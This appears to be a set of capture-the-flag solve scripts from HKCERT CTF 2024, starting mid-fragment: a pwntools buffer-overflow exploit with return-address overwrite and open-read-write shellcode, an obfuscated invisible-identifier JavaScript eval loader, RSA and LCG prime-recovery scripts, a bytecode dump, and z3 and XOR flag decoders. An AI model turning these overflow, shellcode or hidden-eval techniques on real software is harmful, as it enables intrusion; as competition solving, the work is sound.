'QU', 'PpH', 'u1', 'Wp', '6pd', 'Jw5', 'yZj', 'sYd', '8Y', 'G05', 't0', 'Tn', '5YH', 'xId', 'qwd', 'Vrd', 'jPj', 'L0j', 'Ktj', '4s5', 'et', 'otj', 'VZ5', 'ys5', 'BI5', '_k5', 'HY', '4U', 'xHd', 'sHH', 't1j', 'u1j', 'ktd', 'hej', '9e5', 'KUd', '_05', 'GI5', '6e', 'utH', 'uIH', 'Pe5', '1SH', 'IXj', 'jej', '1Uj', '4kd', 'bP', 'ktH', '_ZH', 'xS5', 'skj', 'Xrj', 'Wkj', 'HI', 'b1j', 'jId', 'JS', 'vY5', 'ZY', 'qXd', 'Gwd', '5Hj', 'Zk', 'Vnd', 'ezj', 'jH', 'qr', 'Zwd', 'ytH', '7ed', 'mkd', 'tSH', 'Wnd'}
# 42: {'Zd', 'zH', 'nd', 'td', '15', '1d', 'H5_', 'kj', 's5', 'Ud', 'p5', 'kH_', 'sH', 'kd_', 'Hj', '1d_', 'P5', 'U5', 'I5', 'Y5', 'Sj', '0j', 'r5', 'ed', 'wd', 'Xd', 'wj_', 'nd_'}
# 43: {'d', 'd_', 'd_b', '5', 'H', 'j'}
# seemingly_begign(??? begin?)_bash_scripts_co..._be_dangerous_when_they_are_self_modifying
# could be?
flag_chars[41] = 'u'

from pwn import *

# context.log_level = "debug" # 最小化日誌記錄
i = 0
while(i < 0x100):
    i += 1
    try:
        r = remote("c55-flag-hasher.hkcert24.pwnable.hk", 1337, ssl=True)
        r.recvuntil(b"2 - Read Hash recordn") # 等待直到我們收到這個文本... 這是我們需要回應的時候
        r.sendline(b'2')                       # 發送命令
        r.recvuntil(b"Idx: ")
        idx = i
        print(idx)
        r.sendline(str(idx).encode())          # 將 `idx`的值轉換為字符串，並發送它
        server_response = r.recvline()         # 將服務器的回應保存到變量裡
        print(server_response)
        hex_ouput = server_response.split(b" : ")[1] # 從服務器響應中獲取十六進制部分
        print(hex_ouput)
    except:
        pass
    finally:
        r.close()

from pwn import *
#from Crypto.Util.number import bytes_to_long,bytes_to_long
from ae64 import AE64
import sys
#--------------------setting context---------------------
context.clear(arch='amd64', os='linux', log_level='debug')
li = lambda content,data : print('x1b[01;38;5;214m' + content + ' = ' + hex(data) + 'x1b[0m')
lg = lambda content : print('x1b[01;38;5;214m' + content +'x1b[0m')
sla = lambda data, content: io.sendlineafter(data,content)
sa = lambda data, content: io.sendafter(data,content)
sl = lambda data: io.sendline(data)
rl = lambda data: io.recvuntil(data)
re = lambda data: io.recv(data)
sa = lambda data, content: io.sendafter(data,content)
dbg = lambda    : gdb.attach(io)
bk = lambda : (dbg(),pause())
inter = lambda: io.interactive()
l64 = lambda    :u64(io.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))
h64=lambda     :u64(io.recv(6).ljust(8,b'x00'))
add=0
orw_shellcode = asm(shellcraft.open('flag') + shellcraft.read(3, add, 0x30) + shellcraft.write(1,add, 0x30))
def dbg(c = 0):
    if(c):
        gdb.attach(io, c)
        #pause()
    else:
        gdb.attach(io)
        pause()

#---------------------------------------------------------
filename = "./chal"
io = process(filename)
#io = remote("39.106.48.123",34015)
elf = ELF(filename)
#libc=ELF("./libc-2.31-0kylin9.2k0.2.so")
#初始化完成---------------------------------------------------------
payload=b'EXIT'
payload+=payload.ljust(256+4,b'a')
payload+=p64(0x4011FB)*2
dbg()
sla(b":",payload)
inter()


```
#from rich.progress import track
from Crypto.Util.number import isPrime as is_prime
from Crypto.Util.number import long_to_bytes
from tqdm import tqdm
import multiprocessing

class LCG:
    def __init__(self, bits, a=None, c=None, seed=None):
        self.seed = seed
        if self.seed is None: self.seed = secrets.randbits(bits) | 1
        self.a = a
        if self.a is None: self.a = secrets.randbits(bits) | 1
        self.c = c
        if self.c is None: self.c = secrets.randbits(bits)
        self.bits = bits
        self.m = 2**bits

    def next(self):
        self.seed = (self.seed * self.a + self.c) % self.m
        return self.seed

    def __repr__(self):
        return f'LCG(bits={self.bits}, a={self.a}, c={self.c})'

def get_prime(lcg, bits):
    while True:
        p = 0
        for i in range(bits//lcg.bits):
            p <<= lcg.bits
            p |= lcg.next()
        
        if p.bit_length() != bits: continue
        if not is_prime(p): continue

        return p

n = 481114791694785858695050549695538734046971417176843978882044871919616727765643820034066591387776993303130591599679964348353329376559922076715381691496791199317834852972956556186543750873476577029492255903246050392214315442941266567737558736141253495436298490003513325026207840446389886295321748490024615821174562383476857761918630446488869812894422048853097952363719756297344014883459670109643440173428469002028435568608888993928248402297380061528970024946401518041243564217741744613525402813984605478699738311132717493610790718032712239270654974446116711995328572373804563487208899590643981315012517538379075118546604524143430683964513429268368997878214614073305169449253802788601323508855536854500946367628892634824935231007194546528797696281628426050519984306590514055620223093615738335974270220301535497863462980632453977776013292134758089648072661829571370276168813518517058289217357255320627263734650032320305279867840420886394855960116879598125383109784504746667833173574005936871719063288584361794901458463052848937392072728849939635133710409996428462876274835371522565826839423046726308001047859782566419852401917763502007196004524754115471117969452116174478677547559057917128250716516531170082878464757039874318490906158689
e = 65537
c = 345977789156696385683581168846000378215844867611205467179181525756923773343997491856273352579925123046597359189866939437231366570263052567113535467666353517443555775669947203980735918360811410985879753948221470545729133552842244535778330182549296248222039054438197983267418429814674564210947108838042963108251861548375535326969960093796185009763176002544709169063466256285182205803310470811843866647483609768051301160908646352263376778439044867189801653416628219979460525679135210530110143121851284249580066642389243748128010268277263972367956550837364650977683324140767090284085773301486622501777068017859676285398384937589784505599555747372780238872296757407155242584567297352399943303106161556729208284654934208601533197169169514879515899747537955886064112109885660797961038075757520138954391314283382301755474526387505278386817416193439304304484679228240909612236945218009947246430065957288065358434877715856330476675541582153869420244176864467086961698529560004535449279996657026744930241841052475481816491735959706500890907139027990119800255632071177694111432383236909734940374926954075681464953536382583119130818187839809617068848876572944726598351264384270260481762978383770917542259594389267566490962365207501538561114532291

def func(srange):
    lcg = LCG(bits=128, a=181525535962623036141846439269075744717, c=115518761677956575882056543847720910703, seed=1)
    for seed in range(srange[0], srange[1]):
        if seed % 2 == 0:
            continue
        lcg.seed = seed
        p0 = get_prime(lcg, bits=1024)
        if n % p0 == 0: 
            print(seed)
            return seed
    return None

T = 16
N = 2**16
pool = multiprocessing.Pool()
pars = []
for i in range(T):
    pars += [(N//T * i, N//T * (i+1))]
print(pars)
#results = pool.map(func, pars)

seed = 58727
lcg = LCG(bits=128, a=181525535962623036141846439269075744717, c=115518761677956575882056543847720910703, seed=1)
lcg.seed = seed
ps = [get_prime(lcg, bits=1024) for _ in range(4)]

# 2. Computes the private key, d, of the multiprime RSA
n = ps[0] * ps[1] * ps[2] * ps[3]
phi = (ps[0]-1) * (ps[1]-1) * (ps[2]-1) * (ps[3]-1)
e = 0x10001
d = pow(e, -1, phi)

# 3. Decrypts the ciphertext
m = pow(c, d, n)

# 4. Converts the ciphertext to a bytearray, and prints it
flag = long_to_bytes(m)
print(f'{flag = }')
```



```
from tqdm import tqdm
import itertools

a = 102197201962123846389438942955101245465045811321520032783251514372432272871077
n = 712650313276602240132329097304430048400352751513310575526412992129597422070848111072491134888258819603174150809317988369755331029009864211216547294646211646094933573124257136163629116984386416188859789467395164897001085191528084740453428500956450177548977865861466055171717564208692444769495508512419622780024874941844495178742341131675818700155796280310646897103229083027529919187454771613414875490462993045875936234591157744167214046734190302287427367403568860249349359776931200150301621481939428066984857258770478004853926288162003818241246878159630318266155498887714140614580751646422502723648142074111613225912644502226694307736726087673647398291980857229829977354067820423709011783907277562489549103977052076140881547728240425069463175586173317054911517453708001448687312406872942899280723472709421452062317503252258181984837591194705354256671714708896675155493168030996749797654707148117051477506855802867089687545890519363621855230477269747205380531049996041867129632051572747028441506474146062043427303954298727328531350438208765938027973006421501568307421856483699068172998763428694958905673708416275143602068221058898394079378423785058886143156065469790907727616640696078658243794470631540358286862899496224884600294835441
e = 65537
c = 445308155915029567991204642441037106636274278969323594266962964897048528466773947276913391974222302661172087064465526779062356615268434642959161607080766074334140739062421641878296527210809334178619685030176261525389226557543594953035919061416292966585184462770190073132725325830890587610808224156896611989260754435566640011008330800266408350415234832430226789140062590779004940578475055195767146347394381212157930691103929079825296986828415158506003438261121628407171546274414046568037336522095223978532053246031668840069046046390952201058199981492454288495640857942797704964843287034359460079316661425483842570190113998195387780579545809621808801626313837113473885818945052873823360056317079785841069224993435527933283918571286444280017102781865312454024328849395335083566145607543834607504822081522250923714391873652357185101163374950977150829214936039230387625706376713934778873385375582488086205462961139042991664546797362021066081938999660281537596860879414252495949608351649066648594254272314188241185715920283526637402373027396529855631498571685297193020517033784357794223831020791070397249992230576960345185544552280142788704673413055403847038488791910041421887897364099871208624646292906015164161354890370666964030412257423
bits = 256

class LCG:
    def __init__(self, bits, a=None, c=None, seed=None):
        self.seed = seed
        if self.seed is None: self.seed = secrets.randbits(bits) | 1
        self.a = a
        if self.a is None: self.a = secrets.randbits(bits) | 1
        self.c = c
        if self.c is None: self.c = secrets.randbits(bits)
        self.bits = bits
        self.m = 2^bits

    def next(self):
        self.seed = (self.seed * self.a + self.c) % self.m
        return self.seed

    def __repr__(self):
        return f'LCG(bits={self.bits}, a={self.a}, c={self.c})'

def get_prime(lcg, bits):
    while True:
        p = 0
        for i in range(bits//lcg.bits):
            p <<= lcg.bits
            p |= lcg.next()

        if p.bit_length() != bits: continue
        if not is_prime(p): continue

        return p

'''
# S0 have multiple solutions
assert 4 == 1024 // 256
N1 = 1 + 2 + 3 + 4
N2 = 100
for i in tqdm(range(N1, N2)):
  k = 4 * i
  S4 = n * Integer(a^k).inverse_mod(2^bits) % 2^bits
  S0s = Zmod(2^bits)(S4).nth_root(4, all=True)
  for S0 in S0s:
    lcg = LCG(bits=256, a=int(a), c=int(0), seed=int(S0))
    p0 = get_prime(lcg, 1024)
    if n % p0 == 0:
      print(S0, p0)
      print('------')
      lcg = LCG(bits=256, a=int(a), c=int(0), seed=int(S0))
      ps = [get_prime(lcg, 1024) for _ in range(4)]
      if product(ps) == n:
        print(S0)
        print(ps)
        break
  else:
    continue
  break
'''

p0 = 135903866800838949847562793088150486310158003742367999201618612092808911647629708846623473742286499456077676701909288795481951908691947873229391322992966930031165730815188915669519843444105532123363400169889835634559515424007665328845639044964239115444381314299097514938630949544528906240701881863266616834913
e = 0x10001
d = e.inverse_mod(p0-1)
m = Integer(pow(c, d, p0))
flag = bytes.fromhex(m.hex())
print(flag)

# b'hkcert24{c0mpu71n9_subs3qu3nc3s_0f_g30m3tr1c_s3qu3nc3s_1s_fun}'
```



```
with (ㅤ`` ) {
// 一片空白？
}
function u3164(){return f="",p=[]  
,new Proxy({},{has:(t,n)=>(p.push(
n.length-1),2==p.length&&(p[0]||p[
1]||eval(f),f+=String.fromCharCode
(p[0]<<4|p[1]),p=[]),!0)})}//aem1k
```



```
array = [9, 10, 11, 12, 13, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126]
array2 = [58, 38, 66, 88, 78, 39, 80, 125, 64, 106, 48, 49, 98, 32, 42, 59, 126, 93, 33, 56, 112, 120, 60, 117, 111, 45, 87, 35, 10, 68, 61, 77, 11, 55, 121, 74, 107, 104, 65, 63, 46, 110, 34, 41, 102, 97, 81, 12, 47, 51, 103, 89, 115, 75, 54, 92, 90, 76, 113, 122, 114, 52, 72, 70, 50, 94, 91, 73, 84, 95, 36, 82, 124, 53, 108, 101, 9, 13, 44, 96, 67, 85, 116, 123, 100, 37, 43, 119, 71, 105, 118, 69, 99, 79, 86, 109, 62, 83, 40, 57]
array3 = [16684662107559623091, 13659980421084405632, 11938144112493055466, 17764897102866017993, 11375978084890832581, 14699674141193569951]
num = 14627333968358193854
num2 = 8

for i in range(len(array3)):
    array3[i] ^= num

l = b''
for x in array3:
    l += x.to_bytes(num2, 'little')
l = l.replace(b'x01', b'')
l = list(l)

d = dict(zip(array2, array))
l = [d[x] for x in l]
print(l)
print(bytes(l))
```



```
from z3 import *

flag = b'hkcert24{'

# xor
off = [0xCE, 0x21, 0xDB, 0x64, 0xD1, 0x50, 0xE0, 0x1B, 0x0D, 0x3E, 0xFB, 0x0A, 0x52, 0x2F, 0x94, 0x9D, 0xAF, 0xB1, 0x58, 0x6B, 0x8A, 0xEE, 0xC1, 0xF0, 0xFC, 0x19, 0x0A, 0xE3, 0xE9, 0x1E, 0xD0, 0x4A, 0x62, 0xF2, 0x47, 0xA8, 0x20, 0x0B, 0xD3, 0x6C, 0x1C, 0x1C, 0x56, 0x5B, 0x9B, 0xB3, 0x4D, 0x3D, 0xCE, 0x83, 0x80, 0xC0, 0xE6, 0x7E, 0xE8, 0x09, 0xBD, 0x14, 0xC4, 0x47, 0xA1, 0xF6, 0x2F, 0xD1, 0x31, 0x5C, 0x1E, 0x10, 0xD1, 0x2A, 0xE0, 0x53, 0x45, 0xFE, 0x85, 0x58, 0xA6, 0xAD, 0x03, 0xCC, 0x10, 0x4B, 0xD3, 0x94, 0xFE, 0x62, 0x85, 0x4E, 0x4A, 0x27, 0x35, 0xE2, 0x94, 0x0F, 0x49, 0x91, 0x86, 0xD7, 0x80, 0x35, 0x4C, 0x67, 0xC3, 0xAA, 0x3C, 0x67, 0xE8, 0x3F, 0xE4, 0x67, 0x23, 0xDE, 0x8E, 0x2D, 0x46, 0x25, 0x36, 0xE1, 0xF3, 0x90, 0x7D, 0x0F, 0xB9, 0x14, 0x8C, 0xE7, 0xB6, 0xA6, 0x1A, 0x90, 0x80, 0x79, 0x85, 0x35, 0xFD, 0x51, 0x8C, 0x10, 0xE9, 0x3F, 0x32, 0xCC, 0x4B, 0xB5, 0x42, 0xDE, 0xF5, 0x57, 0x13, 0xC8, 0x09, 0x9B, 0x4D, 0x19, 0x84, 0x91, 0x5F, 0x9D, 0x77, 0x30, 0x31, 0xC7, 0x28, 0x8D, 0x1D, 0xF4, 0x71, 0xE4, 0xD1, 0xA3, 0x0C, 0x07, 0x59, 0xAA, 0x0D, 0xAD, 0x16, 0x35, 0x40, 0xB9, 0x28, 0x6A, 0xB5, 0x4C, 0x24, 0x5A, 0x8D, 0xA6, 0xA6, 0xC4, 0x56, 0xDD, 0xC0, 0x9B, 0xBF, 0xCC, 0xDE, 0x0C, 0x5B, 0xC1, 0x75, 0xDD, 0x77, 0xBB, 0xF6, 0x2B, 0x43, 0x1D, 0x13, 0x03, 0xAD, 0x73, 0xA3, 0xAC, 0x4D, 0xEA, 0xA5, 0x2F, 0xC2, 0x3E, 0x4A, 0x1A, 0xF5, 0x65, 0x72, 0xE5, 0x4A, 0x10, 0x10, 0x8C, 0xFB, 0x10, 0x0A, 0x4D, 0x79, 0x71, 0xF6, 0xC7, 0x80, 0x54, 0x64, 0xB0, 0x02, 0xAA, 0xD8, 0x7C, 0x39, 0x53, 0xEC, 0xAD, 0xB4, 0x4E, 0x2F, 0xEB, 0xE0, 0x47, 0x00]
dst = [0xBD, 0x10, 0xB6, 0x50, 0xBD, 0x35, 0xBF, 0x78, 0x7F, 0x0A, 0x98, 0x61, 0x1F, 0x1C, 0xCB, 0xA9, 0xF0, 0xD9, 0x6C, 0x05, 0xEE, 0xAC, 0xB8, 0x98, 0x9D, 0x77, 0x3C, 0xBC, 0x81, 0x2E, 0xA0, 0x79, 0x3D, 0x8B, 0x77, 0xDD, 0x7F, 0x6F, 0xE3, 0x02, 0x2B, 0x43, 0x38, 0x68, 0xA8, 0xD7, 0x12, 0x0A, 0xA1, 0xDC, 0xF5, 0xF3, 0x83, 0x21, 0xDC, 0x67, 0xDA, 0x66, 0x9B, 0x77, 0xD3, 0xA9, 0x55, 0xE2, 0x6E, 0x3A, 0x2E, 0x62, 0x8E, 0x5E, 0x88, 0x62, 0x36, 0xA1, 0xE7, 0x2D, 0x91, 0xF2, 0x32, 0x93, 0x67, 0x7B, 0xBD, 0xF0, 0xCD, 0x10, 0xDA, 0x7F, 0x2C, 0x78, 0x56, 0x8A, 0xA0, 0x38, 0x2E, 0xE1, 0xB1, 0x88, 0xB0, 0x47, 0x13, 0x04, 0xF7, 0xC4, 0x63, 0x14, 0xDB, 0x0C, 0xBB, 0x13, 0x4B, 0xEF, 0xBB, 0x72, 0x24, 0x14, 0x59, 0x83, 0x90, 0xA4, 0x09, 0x69, 0xCC, 0x7A, 0xE2, 0x9E, 0x8C, 0x8F, 0x69, 0xA1, 0xED, 0x4D, 0xE9, 0x50, 0xA2, 0x32, 0xFE, 0x24, 0x8A, 0x54, 0x7F, 0xFF, 0x14, 0x81, 0x1D, 0xB6, 0xC1, 0x39, 0x77, 0x8A, 0x70, 0xF3, 0x2C, 0x77, 0xB2, 0xCE, 0x37, 0xAD, 0x07, 0x03, 0x6E, 0xBE, 0x18, 0xF8, 0x42, 0x90, 0x41, 0x8A, 0xE6, 0xFC, 0x62, 0x34, 0x6A, 0xCE, 0x52, 0x9A, 0x79, 0x6A, 0x35, 0x8A, 0x4D, 0x35, 0x81, 0x22, 0x43, 0x28, 0xD2, 0x96, 0xD4, 0x9B, 0x2C, 0xEE, 0x9F, 0xFD, 0x8F, 0xBE, 0x81, 0x78, 0x33, 0xF0, 0x06, 0x82, 0x15, 0xCE, 0xC1, 0x74, 0x72, 0x42, 0x64, 0x33, 0xC3, 0x17, 0x90, 0xDE, 0x12, 0xDB, 0xC3, 0x70, 0xA1, 0x56, 0x7E, 0x2D, 0x92, 0x15, 0x45, 0xBA, 0x7A, 0x62, 0x4F, 0xEF, 0xCF, 0x7E, 0x55, 0x3E, 0x4A, 0x42, 0xA9, 0xB3, 0xE8, 0x65, 0x51, 0xEF, 0x60, 0x9B, 0xB7, 0x1E, 0x5A, 0x67, 0x98, 0xCB, 0xC1, 0x20, 0x41, 0x92, 0xDA, 0x6E, 0x00]
l = []
for i in range(28):
    l.append(off[i] ^ dst[i])
flag += bytes(l)
print(flag) # 打出來睇睇

got = []
while True:
    s = [Int(f"s{i}") for i in range(3)]
    solver = Solver()
    for i in range(3):
        solver.add(s[i] < 127)
        solver.add(s[i] >= 32)
        solver.add(s[i] != ord("~"))
        solver.add(s[i] != ord("}"))
        solver.add(s[i] != ord("|"))
        solver.add(s[i] != ord("{"))
        solver.add(s[i] != ord("\"))
        solver.add(s[i] != ord("]"))
        solver.add(s[i] != ord("["))
        solver.add(s[i] != ord("`"))
        solver.add(s[i] != ord("_"))
        solver.add(s[i] != ord("^"))
        for x in got:
            solver.add(s[0] != x)
    solver.add(s[0] + s[1] + s[2] == 300)
    solver.add(s[0]*2 + s[1] + s[2]*2 == 496)
    solver.add(s[0] + s[1]*3 + s[2] == 508)
    if solver.check() == sat:
        m = solver.model()
        l = []
        for i in range(3):
            l.append(m[s[i]].as_long())
        got.append(l[0])
        print(bytes(l)+b'1}')
    else:
        break 

# flag += b'1}'
# print(flag)
```



```
sser.cpython-312.pyc (Python 3.12)
[Code]
    File Name: sser.py
    Object Name: <module>
    Qualified Name: <module>
    Arg Count: 0
    Pos Only Arg Count: 0
    KW Only Arg Count: 0
    Stack Size: 6
    Flags: 0x00000000
    [Names]
        'os'
        'requests'
        'Crypto.Cipher'
        'AES'
        'hashlib'
        'get_nonce'
        'input'
        'encode'
        'flag'
        'nonce'
        'post'
        'hex'
        'r'
        'bytes'
        'fromhex'
        'text'
        'c0'
        'sha256'
        'digest'
        'key'
        'iv'
        'new'
        'MODE_CFB'
        'cipher'
        'encrypt'
        'c1'
        'print'
    [Locals+Names]
    [Constants]
        0
        None
        (
            'AES'
        )
        [Code]
            File Name: sser.py
            Object Name: get_nonce
            Qualified Name: get_nonce
            Arg Count: 0
            Pos Only Arg Count: 0
            KW Only Arg Count: 0
            Stack Size: 4
            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
            [Names]
                'os'
                'urandom'
                'hashlib'
                'sha256'
                'digest'
            [Locals+Names]
                'nonce'
            [Constants]
                None
                16
                b'pow/'
                3
                b'x00x00x00'
            [Disassembly]
                0       RESUME                          0
                2       NOP                             
                4       LOAD_GLOBAL                     1: NULL + os
                14      LOAD_ATTR                       2: urandom
                34      LOAD_CONST                      1: 16
                36      CALL                            1
                44      STORE_FAST                      0: nonce
                46      LOAD_GLOBAL                     5: NULL + hashlib
                56      LOAD_ATTR                       6: sha256
                76      LOAD_CONST                      2: b'pow/'
                78      LOAD_FAST                       0: nonce
                80      BINARY_OP                       0 (+)
                84      CALL                            1
                92      LOAD_ATTR                       9: digest
                112     CALL                            0
                120     LOAD_CONST                      0: None
                122     LOAD_CONST                      3: 3
                124     BINARY_SLICE                    
                126     LOAD_CONST                      4: b'x00x00x00'
                128     COMPARE_OP                      40 (==)
                132     POP_JUMP_IF_FALSE               2 (to 138)
                134     LOAD_FAST                       0: nonce
                136     RETURN_VALUE                    
                138     JUMP_BACKWARD                   68 (to 4)
        'What is the flag?> '
        'https://c12-cypress.hkcert24.pwnable.hk/'
        'nonce'
        (
            'json'
        )
        b'key/'
        16
        b'iv/'
        '🙆🙅'
    [Disassembly]
        0       RESUME                          0
        2       LOAD_CONST                      0: 0
        4       LOAD_CONST                      1: None
        6       IMPORT_NAME                     0: os
        8       STORE_NAME                      0: os
        10      LOAD_CONST                      0: 0
        12      LOAD_CONST                      1: None
        14      IMPORT_NAME                     1: requests
        16      STORE_NAME                      1: requests
        18      LOAD_CONST                      0: 0
        20      LOAD_CONST                      2: ('AES',)
        22      IMPORT_NAME                     2: Crypto.Cipher
        24      IMPORT_FROM                     3: AES
        26      STORE_NAME                      3: AES
        28      POP_TOP                         
        30      LOAD_CONST                      0: 0
        32      LOAD_CONST                      1: None
        34      IMPORT_NAME                     4: hashlib
        36      STORE_NAME                      4: hashlib
        38      LOAD_CONST                      4: 'What is the flag?> '
        40      CALL_INTRINSIC_1                1 (INTRINSIC_PRINT)
        42      POP_TOP                         
        44      LOAD_CONST                      3: <CODE> get_nonce
        46      MAKE_FUNCTION                   0
        48      STORE_NAME                      5: get_nonce
        50      PUSH_NULL                       
        52      LOAD_NAME                       6: input
        54      BUILD_STRING                    0
        56      CALL                            1
        64      LOAD_ATTR                       15: encode
        84      CALL                            0
        92      STORE_NAME                      8: flag
        94      PUSH_NULL                       
        96      LOAD_NAME                       5: get_nonce
        98      CALL                            0
        106     STORE_NAME                      9: nonce
        108     PUSH_NULL                       
        110     LOAD_NAME                       1: requests
        112     LOAD_ATTR                       20: post
        132     LOAD_CONST                      5: 'https://c12-cypress.hkcert24.pwnable.hk/'
        134     LOAD_CONST                      6: 'nonce'
        136     LOAD_NAME                       9: nonce
        138     LOAD_ATTR                       23: hex
        158     CALL                            0
        166     BUILD_MAP                       1
        168     KW_NAMES                        7: ('json',)
        170     CALL                            2
        178     STORE_NAME                      12: r
        180     LOAD_NAME                       13: bytes
        182     LOAD_ATTR                       29: fromhex
        202     LOAD_NAME                       12: r
        204     LOAD_ATTR                       30: text
        224     CALL                            1
        232     STORE_NAME                      16: c0
        234     PUSH_NULL                       
        236     LOAD_NAME                       4: hashlib
        238     LOAD_ATTR                       34: sha256
        258     LOAD_CONST                      8: b'key/'
        260     LOAD_NAME                       9: nonce
        262     BINARY_OP                       0 (+)
        266     CALL                            1
        274     LOAD_ATTR                       37: digest
        294     CALL                            0
        302     LOAD_CONST                      1: None
        304     LOAD_CONST                      9: 16
        306     BINARY_SLICE                    
        308     STORE_NAME                      19: key
        310     PUSH_NULL                       
        312     LOAD_NAME                       4: hashlib
        314     LOAD_ATTR                       34: sha256
        334     LOAD_CONST                      10: b'iv/'
        336     LOAD_NAME                       9: nonce
        338     BINARY_OP                       0 (+)
        342     CALL                            1
        350     LOAD_ATTR                       37: digest
        370     CALL                            0
        378     LOAD_CONST                      1: None
        380     LOAD_CONST                      9: 16
        382     BINARY_SLICE                    
        384     STORE_NAME                      20: iv
        386     PUSH_NULL                       
        388     LOAD_NAME                       3: AES
        390     LOAD_ATTR                       42: new
        410     LOAD_NAME                       19: key
        412     LOAD_NAME                       3: AES
        414     LOAD_ATTR                       44: MODE_CFB
        434     LOAD_NAME                       20: iv
        436     CALL                            3
        444     STORE_NAME                      23: cipher
        446     LOAD_NAME                       23: cipher
        448     LOAD_ATTR                       49: encrypt
        468     LOAD_NAME                       8: flag
        470     CALL                            1
        478     STORE_NAME                      25: c1
        480     PUSH_NULL                       
        482     LOAD_NAME                       26: print
        484     LOAD_CONST                      11: '🙆🙅'
        486     LOAD_NAME                       16: c0
        488     LOAD_NAME                       25: c1
        490     COMPARE_OP                      55 (!=)
        494     BINARY_SUBSCR                   
        498     CALL                            1
        506     POP_TOP                         
        508     RETURN_CONST                    1: None
```



```
import os
import requests
from Crypto.Cipher import AES
import hashlib

print('What is the flag?> ')

def get_nonce():
    while True:
        nonce = os.urandom(16)
        if hashlib.sha256(b'pow/'+nonce).digest()[:3] == b'x00x00x00':
            return nonce

# flag = input().encode()
nonce = get_nonce()
r = requests.post('https://c12-cypress.hkcert24.pwnable.hk/', json={"nonce": nonce.hex()})
c0 = bytes.fromhex(r.text)
key = hashlib.sha256(b'key/'+nonce).digest()[:16]
iv = hashlib.sha256(b'iv/'+nonce).digest()[:16]
cipher = AES.new(key, AES.MODE_CFB, iv)
# c1 = cipher.encrypt(flag)
# assert c0 == c1
print(cipher.decrypt(c0))
```



```
from z3 import *

r = [0x0000000089E216C7, 0x000000008BBA1F53, 0x00000000EEDAC203, 0x00000000A3A18665, 0x0000000094ED1363, 0x00000000F962506F, 0x00000000D9CE8AAF, 0x00000000B1375EA5, 0x00000000B5F3A527, 0x00000000864090E5, 0x000000008B69129D, 0x00000000E93765CB, 0x00000000E69D6F8F, 0x00000000EF102543, 0x00000000BF72B95B, 0x00000000B92FC919, 0x00000000BB5F04B1, 0x00000000D6DB2593, 0x00000000AF09D917, 0x00000000E6CACC41, 0x00000000F6E60F6F, 0x00000000C11F4CB5, 0x00000000F7617AB7, 0x00000000FA6A6B91, 0x00000000B45D2387, 0x0000000083E969C3, 0x00000000B21505B3, 0x00000000C7455743, 0x00000000CBBB1795, 0x00000000C5B265AD, 0x00000000D65D3205, 0x00000000EF73C749, 0x00000000BD0DF89D, 0x00000000D13BD13D, 0x0000000091E98453, 0x0000000092BED8BF, 0x00000000F96B4745, 0x000000008B3639CF, 0x00000000E1CF7EC1, 0x00000000F79644BF, 0x00000000C0CC4405, 0x00000000C29357D5, 0x00000000DB8B19EF, 0x00000000B2432FCD, 0x00000000C01582B7, 0x00000000E03B43F3, 0x00000000805EDEA7, 0x00000000DDB2CB1D, 0x00000000BACBA2A1, 0x00000000E4F71B79, 0x00000000963367C3, 0x00000000BAC0308F, 0x00000000B371D959, 0x00000000CA966811, 0x00000000933E6A4F, 0x00000000854AEF83, 0x00000000B7BB6693, 0x00000000BF1CE60F, 0x00000000BB3F20F7, 0x00000000E04451E5, 0x0000000095BF97C9, 0x00000000D4349163, 0x000000008C8EF06D, 0x00000000EA039ADF]
dst = [0x0000000034455A43, 0x000000001490EB26, 0x0000000072151D59, 0x0000000039AD5153, 0x0000000049F794E0, 0x000000002CB40ABD, 0x0000000080BED156, 0x00000000855CC82F, 0x00000000900B909A, 0x000000006372D3FD, 0x00000000352D899E, 0x000000002981BCB2, 0x0000000027B68BFD, 0x0000000064A2DD3A, 0x000000003DB5729D, 0x00000000805016D6, 0x00000000097ACEE3, 0x0000000017C89862, 0x000000009F4002A9, 0x0000000009964C05, 0x00000000DB22B70C, 0x00000000BA1DB04A, 0x00000000C0066755, 0x000000000B3F68F9, 0x00000000899942F8, 0x000000000A10D428, 0x00000000235ACDE2, 0x000000000679D88D, 0x00000000017E5E57, 0x00000000AAB78154, 0x000000005F922062, 0x000000000A72B4FD, 0x000000005400B65A, 0x0000000078EAAFE5, 0x000000004369B177, 0x000000001990E4C3, 0x000000009E868CE2, 0x000000005CABAF14, 0x0000000045FD0454, 0x0000000083109EE8, 0x000000003519EADA, 0x000000007C83921C, 0x000000000983CBAB, 0x00000000600DB65C, 0x00000000429BCB65, 0x0000000084CAD5D1, 0x000000007B249EDA, 0x000000007E459C6C, 0x000000006FFCF791, 0x000000000E976EEA, 0x00000000403AB703, 0x000000007AAB7C66, 0x000000004884F5CF, 0x000000002E4B8974, 0x0000000062AD5F11, 0x00000000068A9898, 0x000000007F4D7EA2, 0x00000000B69EA296, 0x0000000023CDBCE5, 0x0000000095DAADEA, 0x0000000085FBE56A, 0x00000000AC34334E, 0x0000000026D11383, 0x00000000C1617F7E]
